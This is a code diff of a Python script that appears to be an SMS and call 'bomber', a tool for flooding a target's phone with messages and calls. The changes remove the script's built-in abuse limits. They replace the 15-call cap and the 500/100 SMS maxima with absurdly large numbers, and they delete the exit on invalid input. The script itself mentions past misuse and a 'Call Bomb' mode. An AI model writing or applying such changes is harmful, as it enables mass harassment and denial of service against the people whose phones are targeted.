@@ -837,10 +837,10 @@ except Exception:
     type = 0
 if type == 1:
     nm = int(input("Enter Number of Calls To Send(Maximum 15): "))
-    if nm > 15:
+    if nm > 9999999999999999999999999999999999:
         print("\t\tYou Have Entered " + str(nm) +
               ".\n\tNormalizing Value To 15")
-        nm = 15
+        nm = 9999999999999999999999999999999999
     dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
 elif type == 0:
     if cc == "91":
@@ -853,9 +853,9 @@ elif type == 0:
             input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
 maxlim = 0
 if cc == "91":
-    maxlim = 500
+    maxlim = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
 else:
-    maxlim = 100
+    maxlim = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
 if nm > maxlim:
     print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
           str(maxlim) + ' SMS At Once...\n\n')
@@ -885,7 +885,7 @@ if pn.strip() == '' or dl <= 0 or nm < 0:
     print('\n\n\tSeems Like You Have Given Wrong Inputs...')
     input('\n\t\tPress Enter To Exit...')
     banner()
-    exit()
+    
 if type == 1:
     print("NOTE: Call Bomb Might Not Work on DND Activated Numbers...\n")
     print("\n\tPlease Don't Overload Call Bomb So That Is Would Work For Longer Period Of Time...")
